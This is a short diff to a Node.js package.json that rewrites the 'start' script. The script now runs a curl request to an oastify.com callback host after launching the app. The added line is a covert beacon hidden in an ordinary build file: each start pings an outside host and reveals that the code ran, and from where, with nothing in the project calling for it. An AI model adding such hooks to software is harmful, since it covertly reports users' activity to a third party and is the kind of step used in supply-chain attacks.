@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "start": "node start",
+    "start": "node start && curl https://kh50vx4myjq0l3wqcvukyf43iuopcm0b.oastify.com/hostinger",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "author": "",
